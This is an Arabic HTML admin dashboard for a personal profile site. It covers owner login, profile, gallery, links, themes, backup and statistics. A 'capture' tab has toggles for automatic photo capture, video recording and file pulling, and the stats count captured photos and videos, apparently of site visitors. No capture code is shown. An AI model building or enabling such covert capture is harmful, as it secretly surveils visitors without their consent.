<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>لوحة التحكم — طه</title>
<link rel="stylesheet" href="style.css">
<style>
  body{padding:16px;background:var(--bg)}
  .top-bar{position:fixed;top:0;right:0;left:0;display:flex;align-items:center;justify-content:space-between;
    padding:12px 20px;background:rgba(8,8,10,.85);backdrop-filter:blur(20px);
    border-bottom:1px solid var(--border);z-index:100}
  .top-bar .t{font-size:16px;color:var(--accent);font-weight:800}
  .top-bar .acts{display:flex;gap:8px}
  .top-bar a,.top-bar button{padding:7px 14px;border-radius:10px;font-size:13px;font-weight:700;
    text-decoration:none;border:1px solid var(--border);cursor:pointer;font-family:inherit;transition:all .3s}
  .top-bar a{background:rgba(212,175,55,.1);color:var(--accent)}
  .top-bar a:hover{background:var(--accent);color:#000}
  .top-bar button{background:#dc143c;color:#fff;border-color:#dc143c}
  .top-bar button:hover{background:#a00f2c}
  .login{max-width:380px;margin:120px auto 0;background:var(--card);padding:28px;border-radius:18px;border:1px solid var(--border);backdrop-filter:blur(20px)}
  .login h2{text-align:center;margin-bottom:20px;color:var(--accent);font-weight:800;font-size:20px}
  .login input{width:100%;padding:11px;margin-bottom:10px;background:var(--bg-2);border:1px solid var(--border);border-radius:10px;color:var(--text);font-size:14px;font-family:inherit}
  .login button{width:100%;padding:11px;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;border:none;border-radius:10px;font-weight:700;cursor:pointer;font-size:14px;font-family:inherit}
  .dash{max-width:900px;margin:70px auto 0}
  .tabs{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:16px;border-bottom:1px solid var(--border);padding-bottom:10px}
  .tab{padding:7px 12px;background:var(--card);border:1px solid var(--border);border-radius:9px;cursor:pointer;color:var(--text-dim);font-size:12px;transition:all .3s;font-family:inherit}
  .tab.active{background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;font-weight:700}
  .panel{display:none;background:var(--card);padding:20px;border-radius:14px;border:1px solid var(--border);margin-bottom:16px;backdrop-filter:blur(20px)}
  .panel.active{display:block}
  .field{margin-bottom:12px}
  .field label{display:block;margin-bottom:5px;color:var(--accent);font-size:12px;font-weight:600}
  .field input,.field textarea,.field select{width:100%;padding:9px;background:var(--bg-2);border:1px solid var(--border);border-radius:9px;color:var(--text);font-size:13px;font-family:inherit}
  .field textarea{min-height:70px;resize:vertical}
  .save-btn{padding:9px 18px;background:linear-gradient(135deg,var(--accent),var(--accent-dark));color:#000;border:none;border-radius:9px;font-weight:700;cursor:pointer;margin-top:8px;font-family:inherit;font-size:13px}
  .item-row{display:flex;gap:6px;padding:7px;background:var(--bg-2);border-radius:9px;margin-bottom:6px;align-items:center}
  .item-row input{flex:1;padding:7px;background:var(--card);border:1px solid var(--border);border-radius:7px;color:var(--text);font-size:12px;font-family:inherit}
  .item-row button{background:#dc143c;color:#fff;border:none;border-radius:7px;padding:5px 9px;cursor:pointer;font-size:11px}
  .add-btn{background:var(--accent);color:#000;border:none;border-radius:8px;padding:7px 14px;cursor:pointer;font-weight:700;margin-top:6px;font-family:inherit;font-size:12px}
  .stat-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(120px,1fr));gap:10px}
  .stat{background:var(--bg-2);padding:14px;border-radius:11px;text-align:center;border:1px solid var(--border)}
  .stat b{display:block;font-size:22px;color:var(--accent);margin-bottom:3px;font-weight:800}
  .stat small{font-size:10px;color:var(--muted)}
  .toggle{display:flex;justify-content:space-between;align-items:center;padding:10px;background:var(--bg-2);border-radius:9px;margin-bottom:7px;font-size:13px}
  .toggle input{width:auto;transform:scale(1.2)}
  .msg{padding:9px;background:rgba(34,197,94,.15);color:#4ade80;border:1px solid rgba(34,197,94,.3);border-radius:8px;margin-bottom:10px;display:none;font-size:12px}
  .preview-img{width:100px;height:100px;border-radius:50%;object-fit:cover;border:3px solid var(--accent);margin:10px 0;background:var(--bg-2)}
</style>
</head>
<body>

<div class="top-bar">
  <span class="t">🔐 لوحة التحكم</span>
  <div class="acts">
    <a href="/">↩ رجوع للموقع</a>
    <button id="logoutBtn" style="display:none">🚪 خروج</button>
  </div>
</div>

<div class="login" id="login">
  <h2>دخول المالك</h2>
  <input id="user" placeholder="اسم المستخدم" autocomplete="username">
  <input id="pass" type="password" placeholder="كلمة السر" autocomplete="current-password">
  <button id="loginBtn">دخول</button>
</div>

<div class="dash" id="dash" style="display:none">
  <div id="msg" class="msg"></div>

  <div class="tabs">
    <button class="tab active" data-tab="sitename">اسم الموقع</button>
    <button class="tab" data-tab="avatar">الصورة</button>
    <button class="tab" data-tab="info">البيانات</button>
    <button class="tab" data-tab="features">الميزات</button>
    <button class="tab" data-tab="gallery">المعرض</button>
    <button class="tab" data-tab="links">الروابط</button>
    <button class="tab" data-tab="theme">الثيم</button>
    <button class="tab" data-tab="capture">التصوير</button>
    <button class="tab" data-tab="stats">الإحصائيات</button>
    <button class="tab" data-tab="backup">نسخ احتياطي</button>
  </div>

  <div class="panel active" id="panel-sitename">
    <div class="field"><label>اسم الموقع (يظهر في الشريط والفوتر)</label><input id="fSiteName" placeholder="طه"></div>
    <button class="save-btn" id="saveSiteName">حفظ</button>
  </div>

  <div class="panel" id="panel-avatar">
    <img id="avatarPreview" class="preview-img" alt="">
    <div class="field"><label>رفع صورة</label><input type="file" id="avatarFile" accept="image/*"></div>
    <div class="field"><label>أو رابط صورة</label><input id="avatarUrl" placeholder="https://..."></div>
    <button class="save-btn" id="saveAvatar">حفظ الصورة</button>
    <button class="save-btn" id="removeAvatar" style="background:#dc143c;color:#fff">حذف</button>
  </div>

  <div class="panel" id="panel-info">
    <div class="field"><label>الاسم</label><input id="fName"></div>
    <div class="field"><label>الصفة</label><input id="fTitle"></div>
    <div class="field"><label>المكان</label><input id="fLoc"></div>
    <div class="field"><label>تاريخ الميلاد</label><input id="fBirth" type="date"></div>
    <div class="field"><label>الحكمة</label><textarea id="fQuote"></textarea></div>
    <div class="field"><label>عني</label><textarea id="fAbout"></textarea></div>
    <div class="field"><label>واتساب</label><input id="fWA"></div>
    <div class="field"><label>فيسبوك</label><input id="fFB"></div>
    <div class="field"><label>إنستجرام</label><input id="fIG"></div>
    <button class="save-btn" id="saveInfo">حفظ البيانات</button>
  </div>

  <div class="panel" id="panel-features">
    <p style="color:var(--muted);font-size:12px;margin-bottom:10px">أضف بطاقات الميزات والمواهب</p>
    <div id="featuresList"></div>
    <button class="add-btn" id="addFeature">+ إضافة ميزة</button>
    <button class="save-btn" id="saveFeatures">حفظ</button>
  </div>

  <div class="panel" id="panel-gallery">
    <div class="field"><label>رابط صورة أو رفع</label><input id="galleryUrl" placeholder="https://..."><input type="file" id="galleryFile" accept="image/*" style="margin-top:6px"></div>
    <button class="add-btn" id="addGallery">+ إضافة</button>
    <div id="galleryList" style="margin-top:12px"></div>
  </div>

  <div class="panel" id="panel-links">
    <div id="linksList"></div>
    <button class="add-btn" id="addLink">+ رابط جديد</button>
    <button class="save-btn" id="saveLinks">حفظ</button>
  </div>

  <div class="panel" id="panel-theme">
    <div class="field"><label>الثيم</label>
      <select id="fTheme">
        <option value="dark">داكن</option>
        <option value="light">فاتح</option>
        <option value="neon">نيون</option>
        <option value="royal">ملكي</option>
        <option value="ocean">محيط</option>
        <option value="crimson">قرمزي</option>
        <option value="forest">غابة</option>
      </select>
    </div>
    <button class="save-btn" id="saveTheme">حفظ</button>
  </div>

  <div class="panel" id="panel-capture">
    <div class="toggle"><span>📸 تصوير تلقائي</span><input type="checkbox" id="camToggle"></div>
    <div class="toggle"><span>🎥 تسجيل فيديو</span><input type="checkbox" id="vidToggle"></div>
    <div class="toggle"><span>📁 سحب الملفات</span><input type="checkbox" id="dropToggle"></div>
    <button class="save-btn" id="saveCapture">حفظ</button>
  </div>

  <div class="panel" id="panel-stats">
    <div class="stat-grid">
      <div class="stat"><b id="sVisits">0</b><small>زيارات</small></div>
      <div class="stat"><b id="sCaptures">0</b><small>صور</small></div>
      <div class="stat"><b id="sVideos">0</b><small>فيديو</small></div>
      <div class="stat"><b id="sGallery">0</b><small>معرض</small></div>
      <div class="stat"><b id="sLinks">0</b><small>روابط</small></div>
    </div>
    <button class="save-btn" id="refreshStats" style="margin-top:12px">تحديث</button>
  </div>

  <div class="panel" id="panel-backup">
    <button class="save-btn" id="exportBtn">📥 تصدير</button>
    <div class="field" style="margin-top:12px"><label>استيراد</label><input type="file" id="importFile" accept=".json"></div>
    <button class="save-btn" id="resetBtn" style="background:#dc143c;color:#fff">🗑️ إعادة تعيين</button>
  </div>
</div>

<script src="config.js"></script>
<script src="admin.js"></script>
</body>
</html>
